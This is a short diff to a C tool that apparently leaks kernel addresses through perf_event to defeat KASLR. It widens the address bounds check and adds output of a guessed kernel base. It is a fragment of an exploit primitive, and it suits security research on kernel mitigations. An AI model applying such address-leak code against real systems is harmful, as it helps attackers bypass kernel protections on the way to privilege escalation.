@@ -8,6 +8,7 @@
 // Largely based on original code by lizzie:
 // https://blog.lizzie.io/kaslr-and-perf.html
 
+#define _GNU_SOURCE
 #include <linux/perf_event.h>
 #include <signal.h>
 #include <stdint.h>
@@ -148,7 +149,7 @@ unsigned long get_kernel_addr_perf() {
   if (fd > 0)
     close(fd);
 
-  if (min_addr > KERNEL_BASE_MIN && min_addr < KERNEL_BASE_MAX)
+  if (min_addr >= KERNEL_BASE_MIN && min_addr <= KERNEL_BASE_MAX)
     return min_addr;
 
   return 0;
@@ -160,6 +161,7 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("lowest leaked address: %lx\n", addr);
+  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
 
   return 0;
 }
